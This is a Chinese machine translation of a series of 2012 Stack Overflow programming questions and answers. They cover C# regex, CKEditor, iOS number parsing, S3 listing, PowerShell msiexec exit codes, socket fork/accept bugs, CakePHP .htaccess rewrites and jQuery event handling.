
> ID：13287314
> 
> 赞同：0
> 
> 时间：2012-11-08T10:37:00.227
> 
> 标签：c#, regex, string

我在文本中搜索一些字符串，并希望删除这些字符串中的第一个和最后一个字符。

例子 ：

```
...
...
OK 125 ab_D9 "can be "this" or; can not be "this" ";
...
OK 673 e_IO1_ "hello; is strong
or maybe not strong";
... 
```

因此，我使用代码查找所有以 OK 开头的字符串，并从 4 组“...”中删除：

```
tmp = fin.ReadToEnd();
var matches = Regex.Matches(tmp, "(OK) ([0-9]+) ([A-Za-z_0-9]+) (\"(?:(?!\";).)*\");", RegexOptions.Singleline);
for (int i = 0; i < matches.Count; i++)
    {
         matches[i].Groups[4].Value.Remove(0);

         matches[i].Groups[4].Value.Remove(matches[i].Groups[4].Value.ToString().Length - 1);
         Console.WriteLine(matches[i].Groups[1].Value + "\r\n" + "\r\n" + "\r\n" + matches[i].Groups[2].Value + "\r\n" + "\r\n" + matches[i].Groups[3].Value + "\r\n" + "\r\n" + "\r\n" + matches[i].Groups[4].Value);
         Console.WriteLine("           ");
    } 
```

但它不会从第 4 组中删除第一个和最后一个字符。我做错了什么？

我的结果应该是：

```
 OK

 125

 ab_D9

 can be "this" or; can not be "this" 

 OK

 673

 e_IO1

 hello; is strong
 or maybe not strong 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T10:45:23.123

您应该分配`Substring()`和`Remove()`方法的结果。它们不会更改现有字符串，而是返回您需要分配给相同或其他字符串变量的更改后的字符串。检查代码：

```
tmp = fin.ReadToEnd();
var matches = Regex.Matches(tmp, "(OK) ([0-9]+) ([A-Za-z_0-9]+) (\"(?:(?!\";).)*\");", RegexOptions.Singleline);
for (int i = 0; i < matches.Count; i++)
    {
         string str = matches[i].Groups[4].Value.Substring(0);

         str = str.Remove(str.Length - 1);
         Console.WriteLine(matches[i].Groups[1].Value + "\r\n" + "\r\n" + "\r\n" + matches[i].Groups[2].Value + "\r\n" + "\r\n" + matches[i].Groups[3].Value + "\r\n" + "\r\n" + "\r\n" + str);
         Console.WriteLine("           ");
    } 
```

PS你应该使用，`Environment.NewLine`而不是`"\r\n"`，这是更好的方法。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-08T10:45:50.563

没有必要删除东西。只是不要一开始就抓住引号。所以将括号向内移动一个字符。

```
"(OK) ([0-9]+) ([A-Za-z_0-9]+) \"((?:(?!\";).)*)\";" 
```

# c# - 在 HTML5 中使用动态 flashVar

> ID：13287316
> 
> 赞同：0
> 
> 时间：2012-11-08T10:37:04.297
> 
> 标签：c#, asp.net, html, flash

**大家好，我有一个理论问题。**

使用 flash，您可以将 flashvars 动态加载到视频或音频 flashobject。但是：我已经有一个像这样加载 flashvars 的 flash 视频。但我想围绕它创建 html5 代码（音频/视频）。我可以在元素/闪存对象之外使用闪存变量吗？

就像将 Flash 源 (mp3) 加载到围绕 Flash 元素的 HTML5 音频元素一样？

**为了使其更直观：**

*   HTML(5) 页面。

包含一个嵌套在 HTML5 音频/视频元素中的 Flash 对象。

*   C# 页面。

将 flashvars 和参数动态加载到 flash 对象。例如 mp3source。

**问题：** 我还能以某种方式将 mp3source flashvar/param 加载到 HTML5 视频/音频中吗？

要加载变量，我会使用 htmlgenericcontrols。如果有人知道如何/如果我可以创建这样的东西......请分享！:)

**感谢您的回答！**

**PS：一些代码**（！不工作，只是给你一个线索！）

C# 参数

```
var mp3param = new HtmlGenericControl("param");
mp3param.Attributes.Add("name", "thevars");
var thevars= "mp3=" + src; 
```

HTML 输出

```
<audio id="htmlaudio" controls="">
    <source src="thisshouldbetheflashmp3source" type="audio/mpeg">
    <object type="application/x-shockwave-flash" data="audioplayer.swf" width="xx" height="xx" id="flashaudio" style="visibility: visible;">
    <param name="thevars" value="mp3=Theflashmp3sourcethatdoesworkbutshouldalsobeusedinhtmlaudio">
</object>
</audio> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T11:12:50.830

让我们假设，这是你的对象标签

```
<object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" width="550" height="400" id="movie_name" align="middle">
    <param name="movie" value="<%=MovieName%>"/>
    <!--[if !IE]>-->
    <object type="application/x-shockwave-flash" data="<%=MovieName%>" width="550" height="400">
        <param name="movie" value="<%=MovieName%>"/>
    <!--<![endif]-->
        <a href="http://www.adobe.com/go/getflash">
            <img src="http://www.adobe.com/images/shared/download_buttons/get_flash_player.gif" alt="Get Adobe Flash player"/>
        </a>
    <!--[if !IE]>-->
    </object>
    <!--<![endif]-->
</object> 
```

您现在可以在后面的代码中创建一个属性来动态获取数据。下面的示例代码

```
public string MovieName{
    get { return "Movie_name.swf"; }
} 
```

# javascript - Chrome 在 ckeditor 中使用 insertHtml 跳过 contenteditable 属性

> ID：13287318
> 
> 赞同：3
> 
> 时间：2012-11-08T10:37:10.117
> 
> 标签：javascript, html, google-chrome, dom, ckeditor

我使用了一个 ckeditor，我想在其中插入一个不可编辑的占位符。根据[文档](http://docs.cksource.com/CKeditor_3.x/Users_Guide/NonEditable_Contents)，您可以将属性 ( `contenteditable="false"`) 设置为所需元素以使其不可编辑。

在 Firefox 中，这工作正常，该属性附加在 上，`span`但在 Chrome 中，该属性被跳过。

我有一个带有以下代码的测试用例：

**HTML**

```
<textarea id="testeditor"><p>testeditor content</p></textarea>
<button id="addPlaceholder">add placeholder</button> 
```

**Javascript**

```
$(function() {
  $('#testeditor').ckeditor();
  $('#addPlaceholder').click(function() {
    var editor = $('#testeditor').ckeditorGet();
    editor.insertHtml('<span class="placeholder" contenteditable="false">placeholder</span>');
  });
}); 
```

* * *

## **编辑**

我进行了另一项测试，以检查`contenteditable`在将元素插入 DOM 时是否附加了属性。这在 Chrome 中运行良好。

**Javascript**

```
$('body').append('<span contenteditable="false">placeholder</span>'); 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-08T10:55:51.647

当我搜索该方法的替代`insertHtml`方法时，我找到了答案。看来您也可以使用该方法`insertElement`。所以我试过了，这并没有跳过该`contenteditable`属性。

**新代码：**

```
$(function() {
  $('#testeditor').ckeditor();
  $('#addPlaceholder').click(function() {
    var editor = $('#testeditor').ckeditorGet();
    editor.insertElement( CKEDITOR.dom.element.createFromHtml( '<span class="placeholder" contenteditable="false">placeholder</span>' ));
  });
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-04-25T20:30:12.203

另一种选择是将可选模式参数设置为“unfiltered_html”：

```
$(function() {
  $('#testeditor').ckeditor();
  $('#addPlaceholder').click(function() {
    var editor = $('#testeditor').ckeditorGet();
    editor.insertHtml('<span class="foo">placeholder</span>', "unfiltered_html");
  });
}); 
```

见：[http ://docs.ckeditor.com/#!/api/CKEDITOR.editor-method-insertHtml](http://docs.ckeditor.com/#!/api/CKEDITOR.editor-method-insertHtml)

# iphone - ios从字符串中加倍，没有四舍五入

> ID：13287322
> 
> 赞同：7
> 
> 时间：2012-11-08T10:37:16.533
> 
> 标签：iphone, ios, double, rounding

下面的代码是四舍五入我的纬度字符串。我不希望它变圆。双纬度必须是 41.04546。

```
NSString *latitude= @"41.04546";
double lat= latitude.doubleValue;  //it gives 41.0455
CLLocationCoordinate2D coordinat;
coordinat.latitude= lat; 
```

对于不能四舍五入的精确坐标。

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-11-08T10:49:16.667

试试这条线..

```
NSString *latitude= @"41.04546";
double lat= [latitude doubleValue];
NSLog(@"\n\n Value Lat ==>> %f",lat); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-08T10:40:35.603

使用 NSNumberFormatter

```
- (NSNumber *)numberFromString:(NSString *)string

NSNumberFormatter *numberFormatter = [[NSNumberFormatter alloc]init]; 
[numberFormatter setNumberStyle:kCFNumberFormatterDecimalStyle];
NSNumber *number = [numberFormatter numberFromString:@"41.04546"];       
NSLog(@"Number : %@ , Double value : %f",number,[number doubleValue]);   

Output:Number : 41.04546 , Double value : 41.045460 
```

[https://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Classes/NSNumberFormatter_Class/Reference/Reference.html](https://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Classes/NSNumberFormatter_Class/Reference/Reference.html)

# java - Amazon 的 S3 可以按日期顺序返回对象摘要吗？

> ID：13287323
> 
> 赞同：10
> 
> 时间：2012-11-08T10:37:16.840
> 
> 标签：java, android, amazon-s3

当我通过 向 S3 请求对象摘要时`amazonS3Client.listObjects()`，列表按键字母顺序返回。

有谁知道如何让 S3 按日期（lastModified）顺序返回对象，所以首先返回最新的对象？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2016-01-24T00:47:44.930

只需对列表进行排序

**爪哇 8**

```
s3ObjectSummaries.sort(Comparator.comparing(S3ObjectSummary::getLastModified)); 
```

**前**

```
Collections.sort(s3ObjectSummaries, new Comparator<S3ObjectSummary>() {
    public int compare(S3ObjectSummary o1, S3ObjectSummary o2) {
        return o1.getLastModified().compareTo(o2.getLastModified());
    }
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-14T11:30:23.660

有趣的问题。在我看来，ListObject 的问题在于您必须下载对象，这些对象可以是 GB 大小。

对此没有解决方案，但我在 .net 开发论坛中找到了解决方法。

[链接到发展论坛](https://forums.aws.amazon.com/thread.jspa?messageID=168210&#168210)

# java - 弹出菜单和 JTable

> ID：13287326
> 
> 赞同：0
> 
> 时间：2012-11-08T10:37:37.840
> 
> 标签：java, swing, jtable, jpopupmenu

我尝试创建一个包含 JTable 并且可以显示其他弹出菜单的弹出菜单。JTable 具有鼠标侦听器，因此当一个菜单项有其他项来显示一个新的 JPopupMenu 时，会在里面创建一个 JTable，依此类推。我遇到的问题是一次只显示一个弹出菜单。每次我的 JTable 弹出菜单中的一个菜单必须显示另一个弹出菜单时，前一个弹出菜单就会消失。

# iphone - NSUserDefault 最大大小

> ID：13287328
> 
> 赞同：-2
> 
> 时间：2012-11-08T10:37:44.787
> 
> 标签：iphone, objective-c, ios, size, nsuserdefaults

> **可能重复：**
> [在 NSUserDefaults 中存储值是否有任何限制](https://stackoverflow.com/questions/7510123/is-there-any-limit-in-storing-values-in-nsuserdefaults)

我可以在 NSUserDefaults 上保存多少数据。所有设备的存储大小是否不同。或所有设备都相同。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T10:45:15.470

你到底为什么要存储这么多数据`NSUserDefaults`？

`NSUserDefaults' 不应用作全局字典。

尝试使用属性列表和核心数据。

# postgresql - matplotlib barchart：如何在 postgres-generate_series 中均匀分布条形？

> ID：13287332
> 
> 赞同：1
> 
> 时间：2012-11-08T10:37:55.463
> 
> 标签：postgresql, matplotlib, bar-chart, psycopg2

我正在使用 matplotlib 创建一个条形图，并使用 psycopg2 连接到 postgres 数据库。

我想在条形图中绘制的数据来自具有以下 SQL 的 postgres 数据库：

```
SELECT  
(to_char(serie,'yyyy'))::text::int AS Year,  
sum(amount)::numeric::int AS eintraege   
FROM ( SELECT...) ... ; 
```

sql 中的“serie”代表从 2006 年到 2012 年的 generate_series。这段代码在我的 python 脚本中，用于绘制结果：

```
plt.bar(year, count, align='center')  
fig.autofmt_xdate()  
plt.xticks(year, (year))  
plt.xlabel('year')  
plt.ylabel('V1M0') 
```

这导致了这个情节：

![在此处输入图像描述](../Images/eb68888567bfbf6acc30c9c46ee9e778.png)

到目前为止，我得到了我期望得到的:-)

但是，如果我在上面的 sql 中扩展我的 generate_series (to_char(serie,'yyyy') ，那么它不仅给了我年份而且还给了我几个月 ((to_char(serie,'yyyymm') 情节看起来有点奇怪：

![在此处输入图像描述](../Images/fa92b5e16d2af62d5000a12b23269df6.png)

我的印象是这些条是按年份分组的，因为我的数据库中只有一个 2006 年（2006 年 12 月）的条目，但 2007 年每个月都有一个值。

所以我的问题是：我怎样才能解决一个分布均匀的图（如第一个图）。我错过了什么吗？我在网上搜索了几个小时，但找不到解决问题的提示或解决方案。

我将不胜感激您能提供的任何帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-09T09:52:50.577

我没有找到这种行为的实际原因，而是一种解决方法：
SELECT
(to_char(serie,'yyyymm'))::text AS Year,
sum(amount)::numeric::int AS eintraege
FROM (SELECT...) 。 .. ;
不要将 generate_series 转换回整数，而是将列格式化为字符串。然后进行绘图，计算“plt.xticks”中字符串的长度

```
plt.bar(range(len(count)), count, align='center', label='Anzahl an erstellten Objekten')
fig.autofmt_xdate()  
plt.xticks(range(len(count)), (year)) 
plt.xlabel('year')  
plt.ylabel('V1M0') 
```

现在情节看起来不错（不要介意轴标签，以后可以更改）。
[http://geospatialview.de/wp-content/uploads/2012/11/Histogramm_komisch_geloest.png](http://geospatialview.de/wp-content/uploads/2012/11/Histogramm_komisch_geloest.png)

# sockets - SOCK_SEQPACKET 可用性？

> ID：13287333
> 
> 赞同：6
> 
> 时间：2012-11-08T10:38:00.130
> 
> 标签：sockets, networking, tcp, ip

使用原始 TCP 套接字时，需要使用长度前缀或分隔符进行消息框架，如此[处所述。](http://www.codeproject.com/Articles/37496/TCP-IP-Protocol-Design-Message-Framing)

我今天遇到了“SOCK_SEQPACKET”套接字选项，它显然可以几乎透明地执行消息框架。

目前在平台和操作系统中“SOCK_SEQPACKET”的可用性如何？（Windows、OSX、Linux、IOS、安卓...）

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-08T11:07:05.663

我你使用`SOCK_SEQPACKET`的`AF_INET`，这样：

```
socket(AF_INET, SOCK_SEQPACKET, 0); 
```

你不会得到 TCP 套接字。如果您的平台支持，该套接字将是一个 SCTP 套接字。

SCTP 尚未广泛使用。最新的 Linux 版本支持它（如果启用了 SCTP）。

还有[一些适用于 Windows 的库](https://stackoverflow.com/questions/2153700/what-kind-of-sctp-support-is-there-on-various-windows-versions)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-10-02T13:36:13.693

SCTP 在 Mac OS X (El Captain) 上仍然不可用。[在https://github.com/sctplab/SCTP_NKE_ElCapitan](https://github.com/sctplab/SCTP_NKE_ElCapitan)有一个第 3 方开源内核扩展- 但它没有签名，因此您必须禁用 Apple 系统完整性保护。

参见例如[https://apple.stackexchange.com/questions/114217/sctp-kernel-extension-for-mavericks](https://apple.stackexchange.com/questions/114217/sctp-kernel-extension-for-mavericks)

*同样，您也不能在 Mac OS X 上将 SOCK_SEQPACKET 与 AF_UNIX 一起使用。*

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-05-24T21:16:29.390

**Linux**：[从 2.6.4 版开始可用](http://man7.org/linux/man-pages/man7/unix.7.html)

**Mac OS**：[不可用](https://developer.apple.com/library/content/releasenotes/Miscellaneous/RN-Foundation-OSX10.12/index.html) *（更好的来源？）*

**窗户**：[不可用](https://blogs.msdn.microsoft.com/commandline/2017/12/19/af_unix-comes-to-windows/)

# powershell - 在 PowerShell 中检索 MSIEXEC 退出代码

> ID：13287334
> 
> 赞同：12
> 
> 时间：2012-11-08T10:38:04.093
> 
> 标签：powershell, windows-installer

我需要`MSIEXEC`从 PowerShell 运行命令行并检查安装是否成功。

如果我做：

```
msiexec.exe /qn /l*v e:/tmp/surfaceruntime.log  /i '\\nas\lui\tools\surfaceruntime2.msi' 
```

（指定的 MSI 不存在 - 用于测试目的）

我得到一个`$LASTEXITCODE`1

OTOH，如果我这样做：

```
$parms=@("/qn", "/l*v", "e:/tmp/surfaceruntime.log";"/i";"\\nas\lui\tools\surfaceruntime2.msi") 

$run=[System.Diagnostics.Process]::Start("msiexec",$parms) 
$run.WaitForExit() 
$run.ExitCode 
```

我得到 1619（就像`%ERRORLEVEL%`我从 运行命令行一样`CMD`）。

怎么会`$LASTEXITCODE`不正确？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-11-08T12:18:44.203

尝试这个：

```
(Start-Process -FilePath msiexec.exe -ArgumentList $parms -Wait -Passthru).ExitCode 
```

# c# - 为 iis 创建池

> ID：13287335
> 
> 赞同：3
> 
> 时间：2012-11-08T10:38:08.990
> 
> 标签：c#, asp.net, iis, connection-pooling

我是 .net 世界的新手，但已经编程了约 15 年。今天，我们有一个基于客户端/服务器的系统（即内部开发）。瘦客户端通过套接字连接到业务逻辑进程 (BLP)。

客户端向 BLP 发送 xml 消息，BLP ​​通过与 xml 相同的套接字进行回复

到目前为止，一切都很好。BLP 是用非托管 c 或 Ada 编写的（我们有两个系统，相同的设计）

这些 BLP 现在将作为 Web 服务发布，（或者至少它们提供的一些服务是）

我们决定使用 .net/c#/IIS7 作为应用服务器。

Web 服务请求进入 IIS，然后将其传递给我们的 c# 代码。现在，产生这些 BLP 非常繁重，所以我为它们编写了一个池，它产生了 10 个连接，以及 aps.net c# 代码可以调用的一些函数来要求来自池的连接，并返回一个到池的连接。这基本上是一个连接的套接字。

那么我的问题是，如何在 IIS 中使这个池成为静态的？我认为它是一种“数据库”池，最好在 web.config 中有一个描述连接池的条目。

*   有什么我应该实现的接口吗？
*   有什么示例代码可以看吗？
*   可行吗？

我的大部分搜索都描述了应用程序池，我认为这不是我想要的。

感谢有见地的评论

编辑：

嗯，投票是线程安全的，所以我先尝试了第一个选项。有一个 global.asax 和一个 global.asax.cs alreay，所以我把代码像

```
public class WebApiApplication : System.Web.HttpApplication
{
    //bnl start
    private  Pool myPool = null;
    public Pool MyPool
    {
        get { return myPool; }
    }
    //bnl stop

    protected void Application_Start()
    {
        AreaRegistration.RegisterAllAreas();

        WebApiConfig.Register(GlobalConfiguration.Configuration);
        FilterConfig.RegisterGlobalFilters(GlobalFilters.Filters);
        RouteConfig.RegisterRoutes(RouteTable.Routes);
        BundleConfig.RegisterBundles(BundleTable.Bundles);

        //bnl start
        myPool = new Pool(3, 0, "localhost", 58031, "user", "pwd", "proj");
        myPool.Initialize();
        //bnl stop

    }
} 
```

但后来在控制器中，我看不到游泳池..

```
 namespace Resttest.Controllers
    {
        public class ValuesController : ApiController
        {
          // GET api/values
           public IEnumerable<string> Get()
           {  
              // the pool has method getPoolItem to return a free item/connection
              PoolItem pi = Resttest.WebApiApplication.MyPool.getPoolItem();
              return new string[] { "value1", "value2" };
           } 
```

但是从控制器看不到 Resttest.WebApiApplication.MyPool 。在这个世界上完全是新手，有什么明显的错误吗？/比约恩

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T11:21:51.600

例如，ASP.NET 应用程序不像 PHP 应用程序那样工作：每个 ASP.NET Web 应用程序都可以不间断地运行，无论请求的生命周期如何。然而，默认情况下它每 20 分钟回收一次。您可以在应用程序池参数中更改此值。

要在应用程序启动期间创建静态资源，请创建一个 global.asax 和（其姐妹 global.asax.cs）并将您的代码放入`ApplicationStart`事件中。有一个 Visual Studio 模板可以自动创建这些文件。

由于堆在请求之间共享，因此也将共享单例。但是，要特别注意线程安全，因为多个请求可以并行运行。

另一种解决方案（最好的一个虽然更复杂）是使用像[Autofac](http://code.google.com/p/autofac/)这样的 IoC 容器并为您的服务注册一个全局实现（有关更多解释，请参阅文档，解释如何设置和使用 Autofac 并不真正在这个答案的范围）

# c++ - 将 lambdas 放入静态初始化列表并通过引用捕获是否安全？

> ID：13287339
> 
> 赞同：3
> 
> 时间：2012-11-08T10:38:34.730
> 
> 标签：c++, reference, static, lambda, initializer-list

```
void func(const std::string& args)
{

    // Statically initialize a vector of lambdas (only one here for now)
    // The lambdas capture by reference with[&], but since the
    // initializer list is static (and thus initialized only once), how
    // will the lambda be able to access args with each successive call to func()?
    // Won't there be undefined behavior with this?
    static std::vector<std::function<void()>> FuncMap =
    {

        // args (and everything else in scope) will be captured by reference
        { [&]() { for(const auto& s: args) std::cout << s << std::endl; }}

    };

    auto f = FuncMap[0];

    f();
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T11:16:27.937

我不知道您是出于好奇而问这个问题，还是您实际上是在尝试做这样的事情。如果是后者，这是一个可能的解决方案：

```
void func(const std::string& args)
{
    static std::string const * pargs;
    static std::vector<std::function<void()>> FuncMap =
    {        
        { [&]() { for(const auto& s: *pargs) std::cout << s << std::endl; }}
    };

    pargs = &args;
    auto f = FuncMap[0];

    f();
} 
```

# .htaccess - 在 Cakephp 2.0 中使用 .htaccess 进行 URL 重定向

> ID：13287341
> 
> 赞同：4
> 
> 时间：2012-11-08T10:38:50.487
> 
> 标签：.htaccess, cakephp, cakephp-2.0

我使用的是 Cakephp 2.0，我的网站域名是 www.sample.com，如果我尝试访问 sample.com（没有 www），那么它会转到 www.sample.com，这很好。但我的问题是我的域包含很多页面，例如：

```
> http://www.sample.com/users/login
> http://www.sample.com/users/add 
```

如果我像[http://sample.com/users/login](http://sample.com/users/login)这样访问上面的网址，那么它会重定向到

```
>  http://www.sample.com/index.php?url=users/login 
```

但它需要重定向到

```
 http://www.sample.com/users/login 
```

我已经编写了以下代码 .htaccess 文件（在 app 文件夹之前）来重定向

```
Rewritecond %{http_host} ^sample.com [NC]
Rewriterule ^(.*)$ http://www.sample.com/$1 [R=301,NC] 
```

在 webroot 文件夹中，我有一个包含以下代码的 .htacces 文件，这可能是我认为的问题

```
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteCond %{REQUEST_FILENAME} !-d
RewriteCond %{REQUEST_FILENAME} !-f
RewriteRule ^(.*)$ index.php?/$1 [QSA,L] 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-08T10:46:28.580

您是要始终删除 www 还是始终保留 www？这将添加它：

```
## Add www
RewriteCond %{HTTP_HOST} !^www\.
RewriteCond %{HTTPS}s ^on(s)|
RewriteRule ^ http%1://www.%{HTTP_HOST}%{REQUEST_URI} [L,R=301]

## CakePHP
RewriteRule ^$ app/webroot/ [L]
RewriteRule (.*) app/webroot/$1 [L] 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T10:46:52.550

尝试编写下一条规则：

```
RewriteCond %{HTTP_HOST} ^sample.com [NC]
RewriteRule ^(.*)$ http://www.sample.com/$1 [L,R=301] 
```

在 app/webroot/.htaccess 文件上，而不是在 app 的文件夹 .htaccess 上。它非常适合我。

# javascript - 在选择选项上使用 onChange

> ID：13287350
> 
> 赞同：0
> 
> 时间：2012-11-08T10:39:21.957
> 
> 标签：javascript, jquery, javascript-events

我有一个动态填充的选择选项框，所以如果我更改选择，其他一些框会被填充，我也可以删除它们。这也从选择框中删除了选项，这很好用，但是当我删除选项并且框中只剩下一个选项时，似乎无法触发该选项。

```
$("#email_name").on("change", function(){
    var componentkeys = myDailyemail.getKeys($("#Component").val());
    $.each(componentkeys, function(kIndex, kItem) {
        $("#key").append($("<option/>").val(kItem).text(kItem.toUpperCase()));
    });
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T10:41:52.793

您可以使用`.trigger()`手动触发事件。

在需要的地方插入以下内容。

```
$("#email_name").trigger('change'); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T10:43:36.427

您可以在填充 select 元素后自动触发 change 事件，就好像用户已经选择了第一个选项一样。

```
$("#email_name").on("change", function(){
    var componentkeys = myDailyemail.getKeys($("#Component").val());
    $.each(componentkeys, function(kIndex, kItem) {
        $("#key").append($("<option/>").val(kItem).text(kItem.toUpperCase()));
    });
    $("#key").trigger("change"); // trigger key
}).trigger("change"); // trigger email_name 
```

我不确定你想触发什么，所以我输入了两种可能性。

# jquery - 从 jQuery 访问 Tab2 组件

> ID：13287354
> 
> 赞同：0
> 
> 时间：2012-11-08T10:39:29.737
> 
> 标签：jquery, primefaces, tabview

我正在尝试获取当前关注的组件 ID。为此，我使用了以下 jQuery：

```
<script>
    $(document).ready(function(){
        $("*").focus(function(){
            $('#hiddenInput').val($(this).attr('name'));
        });
    });
</script> 
```

我有一个`tabview`带有 2 个选项卡的选项卡，并且 tabview`dynamic`属性设置为`true`. 当我切换到 tab2 时，jQuery 不会被 tab2 的组件触发。我注意到没有为 tab2 的组件生成 HTML 源代码。我该如何解决这个问题？

生成的标记如下：

```
<div class="ui-tabs-panels">
    <div id="j_idt76:j_idt77" class="ui-tabs-panel ui-widget-content ui-corner-bottom" role="tabpanel" aria-hidden="false">
        <table cellpadding="5" cellspacing="5">
            <tbody>
                <tr>
                    <td><label> Customer ID</label></td>
                    <td>
                        <input id="j_idt76:j_idt82" name="j_idt76:j_idt82" type="text" value="0893000453 " size="45" readonly="readonly" class="ui-inputfield ui-inputtext ui-widget ui-state-default ui-corner-all" />
                        <script id="j_idt76:j_idt82_s" type="text/javascript">PrimeFaces.cw('InputText','widget_j_idt76_j_idt82', id:'j_idt76:j_idt82'});</script>
                    </td>
                </tr>
            </tbody>
        </table>
    </div>
    <div id="j_idt76:j_idt147" class="ui-tabs-panel ui-widget-content ui-corner-bottom ui-helper-hidden" role="tabpanel" aria-hidden="true"></div>
</div> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T11:18:51.650

```
<script>
        $(document).ready(function(){
             $("body").delegate(":input", "focus", function(){
                 $('#hiddenInput').val($(this).attr('name'));
              });
        });
</script>

We can achieve this using delegate function. 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-09T08:53:57.717

下面给出的 tabview 的标记...

我注意到了几件事，

1.即使我点击tab2，tab2中组件的标记也没有生成，所以无法访问组件。

2.当我使用 Ajax 更新我的表单时，我无法访问在 ajax 调用之前可以访问的组件。

```
 <div class="ui-tabs-panels">
             <div id="j_idt76:j_idt77" role="tabpanel" aria-hidden="false">
                                    <table>
                                        <tbody>
                                            <tr>
                                                <td><input id="j_idt76:j_idt82" name="j_idt76:j_idt82" type="text" /></td>
                                                Other components....
                                            </tr>
                                        </tbody>
                                    </table>
                                </div>
              <div id="j_idt76:j_idt147" role="tabpanel" aria-hidden="true"></div>
        </div> 
```

在上面的代码中，生成了 Tab1(j_idt76:j_idt77) 中组件的标记，但不生成 Tab2(j_idt76:j_idt147) 的标记。

# sockets - 套接字错误的文件描述符

> ID：13287359
> 
> 赞同：0
> 
> 时间：2012-11-08T10:39:46.387
> 
> 标签：sockets, file-descriptor

我想编写一个多客户端套接字程序，
但是在接受阶段我得到了错误的文件描述符。
如何更正我的代码？谢谢！

这是我的代码
[http://codepad.org/q0N1jTgz](http://codepad.org/q0N1jTgz)
谢谢！
这是我的部分代码！

```
while(1)
{
    struct sockaddr_in client_addr;
    int addrlen = sizeof(client_addr);

    /*Accept*/
    if(clientfd = accept(sockfd, (struct sockaddr *)&client_addr, (socklen_t*)&addrlen) < 0)
    {
        perror("Accpet Error");
        close(sockfd);
        exit(-1);
    }

    /*Fork process*/
    if(child = fork() < 0)
    {
        perror("Fork Error");
        close(sockfd);
        exit(-1);
    }
    else if(child == 0)
    {
        int my_client = clientfd;
        close(sockfd);

        send(my_client, welcome, sizeof(welcome), 0);

        while ((res = recv(my_client, buffer1, sizeof(buffer1), 0)) > 0)
        {
            string command(buffer1);
            cout << "receive from client:" << command << ", " << res << " bytes\n";
            memset(buffer1, '\0', sizeof(buffer1));     
        }
    }

    close(clientfd);

} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T11:07:50.013

您的代码中存在一些错误，首先您需要在`child`和的分配周围使用括号`clientfd`。

行`68`应更改为

```
 if((clientfd = accept(sockfd, (struct sockaddr *)&client_addr, (socklen_t*)&addrlen)) < 0) 
```

和线`76`应该是

```
 if((child = fork()) < 0) 
```

此外，由于您已经关闭了侦听套接字，因此您必须`return`或来自分叉进程。`exit()`

所以添加`exit(0);`或`return 0;`行后`94`

我强烈建议您在启用警告的情况下编译您的代码，以便及早发现分配问题。例如，如果您正在使用或，请使用`-Wall`and标志`-Wextra``gcc``g++`

# javascript - jQuery - 失踪; 语句错误之前

> ID：13287360
> 
> 赞同：3
> 
> 时间：2012-11-08T10:39:52.043
> 
> 标签：javascript, jquery

我有一个小问题，但我不知道如何解决我用不同的设置制作了一个脚本，但我收到一个错误

```
$(function() {
    $(".basket").hide();
    $(".opened").click(function(){
      $(".basket").slideToggle();
      $(".opened").toggleClass('active');
    });

    $(".black-block .showed").click(function(e){
      $(".black-block").find(".caption").slideToggle();
      $(".showed a").toggleClass('active');
    });
    $(".carousel").jCarouselLite({
        btnNext: "#c1r",
        btnPrev: "#c1l",
        easing: "easeOutQuad",
        visible: 5,

    });
    var currentSlide = 1;
    var currentPage = 0;
    $('#slideshow').slides({
                preload: true,
                preloadImage: 'img/loading.gif',
                effect: 'slide',
                crossfade: true,
            play: 5000,
                slideSpeed: 350,
                fadeSpeed: 500,
                generateNextPrev: true,
                generatePagination: false,
                animationStart: function(current){
                    $('').animate({
                        bottom:-155
                    },100);
                    if (window.console && console.log) {
                        // example return of current slide number
                        console.log('animationStart on slide: ', current);
                    };
                },
                animationComplete: function(current){
                    $('').animate({
                        bottom:0
                    },200);
                    if (window.console && console.log) {
                        // example return of current slide number
                        console.log('animationComplete on slide: ', current);
                    };

                    var newPage = Math.floor(currentSlide / 6);

                    if (newPage > currentPage) { // Page must be greater
                        $('#c1r').trigger('click');
                    }
                     else (newPage < currentPage) { // Page must be less
                        $('#c1l').trigger('click');
                    }                    
                    currentPage = newPage;
                    currentSlide = current;
                },
                slidesLoaded: function() {
                    $('').animate({
                        bottom:0
                    },200);
                }
            }); 
```

根据Firebug，错误应该在这里：

```
else (newPage < currentPage) { // Page must be less
                    $('#c1l').trigger('click'); 
```

由于我不知道，如果有人可以提示我出了什么问题，那就太棒了。先感谢您。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T10:42:34.113

改变

```
else (newPage < currentPage) { // Page must be less 
```

至

```
else if (newPage < currentPage) { // Page must be less 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-08T10:42:00.593

您在该条件语句之后和之前忘记了`if`关键字`else``newPage < currentPage`

```
